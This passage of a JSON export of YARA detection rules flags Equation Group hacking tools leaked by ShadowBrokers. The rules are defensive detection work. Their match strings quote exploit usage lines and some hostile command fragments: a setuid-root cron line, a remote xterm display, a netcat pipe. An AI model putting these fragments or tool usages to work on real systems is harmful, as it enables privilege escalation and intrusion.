porkclient","minimum_yara":"1.7","name":"EquationGroup_porkclient_RID30FE","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"d9a662b2f250d07c1acf6b2c8fae83ae","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_electricslide_RID321F : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file electricslide\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:51:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Firing with the same hosts, on altername ports (target is on 8080, listener on 443)\" fullword ascii\n      $x2 = \"Recieved Unknown Command Payload: 0x%x\" fullword ascii\n      $x3 = \"Usage: eslide   [options] <-t profile> <-l listenerip> <targetip>\" fullword ascii\n      $x4 = \"-------- Delete Key - Remove a *closed* tab\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 2000KB and 1 of them )\n}","date":"2017-04-08 13:51:41","description":"Equation Group hack tool leaked by ShadowBrokers- file electricslide","minimum_yara":"1.7","name":"EquationGroup_electricslide_RID321F","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"bb7f7662d4e40c35f49cfd26bfaf8bcb","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_libXmexploit2_RID31F6 : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file libXmexploit2.8\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:44:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage: ./exp command display_to_return_to\" fullword ascii\n      $s2 = \"sizeof shellcode = %d\" fullword ascii\n      $s3 = \"Execve failed!\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and 1 of them )\n}","date":"2017-04-08 13:44:51","description":"Equation Group hack tool leaked by ShadowBrokers- file libXmexploit2.8","minimum_yara":"1.7","name":"EquationGroup_libXmexploit2_RID31F6","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"cd6cf0f1d7fdbd6147ccc984d645df3b","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_wrap_telnet_RID3168 : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file wrap-telnet.sh\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:21:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"echo \\\"example: ${0} -l 192.168.1.1 -p 22222 -s 22223 -x 9999\\\"\" fullword ascii\n      $s2 = \"-x [ port to start mini X server on DEFAULT = 12121 ]\\\"\" fullword ascii\n      $s3 = \"echo \\\"Call back port2 = ${SPORT}\\\"\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 4KB and 1 of them )\n}","date":"2017-04-08 13:21:11","description":"Equation Group hack tool leaked by ShadowBrokers- file wrap-telnet.sh","minimum_yara":"1.7","name":"EquationGroup_wrap_telnet_RID3168","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"4403d1422fed835a0398fb9a0bb459fd","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_elgingamble_RID313A : APT DEMO HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file elgingamble\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:13:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"* * * * * root chown root %s; chmod 4755 %s; %s\" fullword ascii\n      $x2 = \"[-] kernel not vulnerable\" fullword ascii\n      $x3 = \"[-] failed to spawn shell: %s\" fullword ascii\n      $x4 = \"-s shell           Use shell instead of %s\" fullword ascii\n   condition: \n      1 of them\n}","date":"2017-04-08 13:13:31","description":"Equation Group hack tool leaked by ShadowBrokers- file elgingamble","minimum_yara":"1.7","name":"EquationGroup_elgingamble_RID313A","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"ef5b6d9324e86e442e489e9d85e3a308","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_cmsd_RID2E6A : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file cmsd\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:13:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"usage: %s address [-t][-s|-c command] [-p port] [-v 5|6|7]\" fullword ascii\n      $x2 = \"error: not vulnerable\" fullword ascii\n      $s1 = \"port=%d connected! \" fullword ascii\n      $s2 = \"xxx.XXXXXX\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 1 of ( $x* ) ) or ( 2 of them )\n}","date":"2017-04-08 11:13:31","description":"Equation Group hack tool leaked by ShadowBrokers- file cmsd","minimum_yara":"1.7","name":"EquationGroup_cmsd_RID2E6A","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"82aff8b3fb6fa34eaaaac7f147cc9e73","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_ebbshave_RID3003 : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file ebbshave.v5\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:21:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"executing ./ebbnew_linux -r %s -v %s -A %s %s -t %s -p %s\" fullword ascii\n      $s2 = \"./ebbnew_linux.wrapper -o 2 -v 2 -t 192.168.10.4 -p 32772\" fullword ascii\n      $s3 = \"version 1 - Start with option #18 first, if it fails then try this option\" fullword ascii\n      $s4 = \"%s is a wrapper program for ebbnew_linux exploit for Sparc Solaris RPC services\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 20KB and 1 of them ) or ( 2 of them )\n}","date":"2017-04-08 12:21:41","description":"Equation Group hack tool leaked by ShadowBrokers- file ebbshave.v5","minimum_yara":"1.7","name":"EquationGroup_ebbshave_RID3003","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"8c9e67e3bdb36bfaa21ed0441bbfdd49","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_eggbasket_RID3070 : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file eggbasket\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:39:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"# Building Shellcode into exploit.\" fullword ascii\n      $x2 = \"%s -w /index.html -v 3.5 -t 10 -c \\\"/usr/openwin/bin/xterm -d 555.1.2.2:0&\\\"  -d 10.0.0.1 -p 80\" fullword ascii\n      $x3 = \"# STARTING EXHAUSTIVE ATTACK AGAINST \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )\n}","date":"2017-04-08 12:39:51","description":"Equation Group hack tool leaked by ShadowBrokers- file eggbasket","minimum_yara":"1.7","name":"EquationGroup_eggbasket_RID3070","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"a1543c0579cb2aff126c59301669dfe8","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_jparsescan_RID30ED : APT DEMO HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file jparsescan\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:00:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage:  $prog [-f directory] -p prognum [-V ver] [-t proto] -i IPadr\" fullword ascii\n      $s2 = \"$gotsunos = ($line =~ /program version netid     address             service         owner/ );\" fullword ascii\n   condition: \n      ( filesize < 40KB and 1 of them )\n}","date":"2017-04-08 13:00:41","description":"Equation Group hack tool leaked by ShadowBrokers- file jparsescan","minimum_yara":"1.7","name":"EquationGroup_jparsescan_RID30ED","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"12e46c85667ffe8ca31955f84fa09ea6","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_sambal_RID2F33 : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file sambal\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:47:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"+ Bruteforce mode.\" fullword ascii\n      $s3 = \"+ Host is not running samba!\" fullword ascii\n      $s4 = \"+ connecting back to: [%d.%d.%d.%d:45295]\" fullword ascii\n      $s5 = \"+ Exploit failed, try -b to bruteforce.\" fullword ascii\n      $s7 = \"Usage: %s [-bBcCdfprsStv] [host]\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )\n}","date":"2017-04-08 11:47:01","description":"Equation Group hack tool leaked by ShadowBrokers- file sambal","minimum_yara":"1.7","name":"EquationGroup_sambal_RID2F33","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"072f7c5cad731648712fe64218dbf452","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_pclean_v2_1_1_2_RID31EE : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file pclean.v2.1.1.0-linux-i386\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:43:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"** SIGNIFICANTLY IMPROVE PROCESSING TIME\" fullword ascii\n      $s6 = \"-c cmd_name:     strncmp() search for 1st %d chars of commands that \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and all of them )\n}","date":"2017-04-08 13:43:31","description":"Equation Group hack tool leaked by ShadowBrokers- file pclean.v2.1.1.0-linux-i386","minimum_yara":"1.7","name":"EquationGroup_pclean_v2_1_1_2_RID31EE","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"cb6063e7d8b7e089dc7473ae79fe2b06","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_envisioncollision_RID33FA : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file envisioncollision\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 15:10:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"mysql \\\\$D --host=\\\\$H --user=\\\\$U --password=\\\\\\\"\\\\$P\\\\\\\" -e \\\\\\\"select * from \\\\$T\" fullword ascii\n      $x2 = \"Window 3: $0 -Uadmin -Ppassword -i127.0.0.1 -Dipboard -c\\\\\\\"sleep 500|nc\" fullword ascii\n      $s3 = \"$ua->agent(\\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\\\");\" fullword ascii\n      $s4 = \"$url = $host . \\\"/admin/index.php?adsess=\\\" . $enter . \\\"&app=core&module=applications&section=hooks&do=install_hook\\\";\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 20KB and 1 of ( $x* ) ) or ( 2 of them )\n}","date":"2017-04-08 15:10:51","description":"Equation Group hack tool leaked by ShadowBrokers- file envisioncollision","minimum_yara":"1.7","name":"EquationGroup_envisioncollision_RID33FA","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"8ef60df99720313bcee319e943059d66","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_cmsex_RID2EE3 : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file cmsex\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:33:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Usage: %s -i <ip_addr/hostname> -c <command> -T <target_type> (-u <port> | -t <port>) \" fullword ascii\n      $x2 = \"-i target ip address / hostname \" fullword ascii\n      $x3 = \"Note: Choosing the correct target type is a bit of guesswork.\" fullword ascii\n      $x4 = \"Solaris rpc.cmsd remote root exploit\" fullword ascii\n      $x5 = \"If one choice fails, you may want to try another.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and 1 of ( $x* ) ) or ( 2 of them )\n}","date":"2017-04-08 11:33:41","description":"Equation Group hack tool leaked by ShadowBrokers- file cmsex","minimum_yara":"1.7","name":"EquationGroup_cmsex_RID2EE3","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"84c5b6d19ae2b7a7816cd839b7cc182b","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_exze_RID2E7F : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file exze\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:17:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"shellFile\" fullword ascii\n      $s2 = \"completed.1\" fullword ascii\n      $s3 = \"zeke_remove\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 80KB and all of them )\n}","date":"2017-04-08 11:17:01","description":"Equation Group hack tool leaked by ShadowBrokers- file exze","minimum_yara":"1.7","name":"EquationGroup_exze_RID2E7F","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"250d04616bdf51ef957517803aacedc5","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_DUL_RID2DA8 : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file DUL\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 10:41:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"?Usage: %s <shellcode> <output_file>\" fullword ascii\n      $x2 = \"Here is the decoder+(encoded-decoder)+payload\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 80KB and 1 of them ) or ( all of them )\n}","date":"2017-04-08 10:41:11","description":"Equation Group hack tool leaked by ShadowBrokers- file DUL","minimum_yara":"1.7","name":"EquationGroup_DUL_RID2DA8","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"c5ffc50667fb8570b15595ad65592cd7","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_slugger2_RID2FEE : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file slugger2\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:18:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"usage: %s hostip port cmd [printer_name]\" fullword ascii\n      $x2 = \"command must be less than 61 chars\" fullword ascii\n      $s1 = \"__rw_read_waiting\" fullword ascii\n      $s2 = \"completed.1\" fullword ascii\n      $s3 = \"__mutexkind\" fullword ascii\n      $s4 = \"__rw_pshared\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and ( 4 of them and 1 of ( $x* ) ) ) or ( all of them )\n}","date":"2017-04-08 12:18:11","description":"Equation Group hack tool leaked by ShadowBrokers- file slugger2","minimum_yara":"1.7","name":"EquationGroup_slugger2_RID2FEE","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"37474786e9ecf74ad2c69179f313789a","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_ebbisland_RID3067 : APT DEMO HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file ebbisland\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:38:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Usage: %s [-V] -t <target_ip> -p port\" fullword ascii\n      $x2 = \"error - shellcode not as expected - unable to fix up\" fullword ascii\n      $x3 = \"WARNING - core wipe mode - this will leave a core file on target\" fullword ascii\n      $x4 = \"[-C] wipe target core file (leaves less incriminating core on failed target)\" fullword ascii\n      $x5 = \"-A <jumpAddr> (shellcode address)\" fullword ascii\n      $x6 = \"*** Insane undocumented incremental port mode!!! ***\" fullword ascii\n   condition: \n      filesize < 250KB and 1 of them\n}","date":"2017-04-08 12:38:21","description":"Equation Group hack tool leaked by ShadowBrokers- file ebbisland","minimum_yara":"1.7","name":"EquationGroup_ebbisland_RID3067","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"5751dfff8e03cb21ac4ffc4743c244ed","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_jackpop_RID2FAB : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file jackpop\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:07:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%x:%d  --> %x:%d %d bytes\" fullword ascii\n      $s1 = \"client: can't bind to local address, are you root?\" fullword ascii\n      $s2 = \"Unable to register port\" fullword ascii\n      $s3 = \"Could not resolve destination\" fullword ascii\n      $s4 = \"raw troubles\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 3 of them ) or ( all of them )\n}","date":"2017-04-08 12:07:01","description":"Equation Group hack tool leaked by ShadowBrokers- file jackpop","minimum_yara":"1.7","name":"EquationGroup_jackpop_RID2FAB","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"16f9fc72ef538421918346856fe51017","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_parsescan_RID3083 : APT DEMO HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file parsescan\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:43:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$gotgs=1 if (($line =~ /Scan for (Sol|SNMP)\\\\s+version/) or\" fullword ascii\n      $s2 = \"Usage:  $prog [-f file] -p prognum [-V ver] [-t proto] -i IPadr\" fullword ascii\n   condition: \n      filesize < 250KB and 1 of them\n}","date":"2017-04-08 12:43:01","description":"Equation Group hack tool leaked by ShadowBrokers- file parsescan","minimum_yara":"1.7","name":"EquationGroup_parsescan_RID3083","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"2e8468475fd9c6d83bfeb364fa213d8c","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_jscan_RID2ED2 : APT DEMO HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file jscan\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:30:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$scanth = $scanth . \\\" -s \\\" . $scanthreads;\" fullword ascii\n      $s2 = \"print \\\"java -jar jscanner.jar$scanth$list\\\\n\\\";\" fullword ascii\n   condition: \n      filesize < 250KB and 1 of them\n}","date":"2017-04-08 11:30:51","description":"Equation Group hack tool leaked by ShadowBrokers- file jscan","minimum_yara":"1.7","name":"EquationGroup_jscan_RID2ED2","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"723d7a648ad32f79c61e36cbaeb4e370","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_promptkill_RID3111 : APT DEMO HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file promptkill\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:06:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"exec(\\\"xterm $xargs -e /current/tmp/promptkill.kid.$tag $pid\\\");\" fullword ascii\n      $x2 = \"$xargs=\\\"-title \\\\\\\"Kill process $pid?\\\\\\\" -name \\\\\\\"Kill process $pid?\\\\\\\" -bg white -fg red -geometry 202x19+0+0\\\" ;\" fullword ascii\n   condition: \n      filesize < 250KB and 1 of them\n}","date":"2017-04-08 13:06:41","description":"Equation Group hack tool leaked by ShadowBrokers- file promptkill","minimum_yara":"1.7","name":"EquationGroup_promptkill_RID3111","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"fb149c88adee0602f9226998ff4cd038","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_epoxyresin_v1_0_0_RID333D : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file epoxyresin.v1.0.0.1\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 14:39:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] kernel not vulnerable\" fullword ascii\n      $s1 = \".tmp.%d.XXXXXX\" fullword ascii\n      $s2 = \"[-] couldn't create temp file\" fullword ascii\n      $s3 = \"/boot/System.map-%s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and $x1 ) or ( all of them )\n}","date":"2017-04-08 14:39:21","description":"Equation Group hack tool leaked by ShadowBrokers- file epoxyresin.v1.0.0.1","minimum_yara":"1.7","name":"EquationGroup_epoxyresin_v1_0_0_RID333D","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"8900a6adb1521fe33f1589f5eb10b15a","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_estopmoonlit_RID31F0 : APT DEMO HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file estopmoonlit\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:43:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[+] shellcode prepared, re-executing\" fullword ascii\n      $x2 = \"[-] kernel not vulnerable: prctl\" fullword ascii\n      $x3 = \"[-] shell failed\" fullword ascii\n      $x4 = \"[!] selinux apparently enforcing.  Continue [y|n]? \" fullword ascii\n   condition: \n      filesize < 250KB and 1 of them\n}","date":"2017-04-08 13:43:51","description":"Equation Group hack tool leaked by ShadowBrokers- file estopmoonlit","minimum_yara":"1.7","name":"EquationGroup_estopmoonlit_RID31F0","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"e19ea12e699972247b8540855783a271","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_envoytomato_RID3188 : APT DEMO HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file envoytomato\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:26:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = 